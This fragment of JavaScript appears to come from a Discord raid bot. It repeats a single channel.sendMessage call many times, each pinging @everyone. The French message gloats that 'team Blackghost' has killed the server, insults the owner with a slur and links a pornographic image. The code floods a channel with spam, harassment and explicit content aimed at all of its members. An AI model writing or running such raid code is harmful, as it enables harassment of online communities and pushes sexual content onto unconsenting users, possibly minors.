    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
    	message.channel.sendMessage("@everyone Oh mon pauvre, ton serveur est dead par la team Blackghost, protège mieux ton serveur la prochaine fois fils de pute ! :skull_crossbones: \nhttp://pornomass.com/download/453-photo-porno-de-sexe-sexe-erotique-et-explicite.jpg")
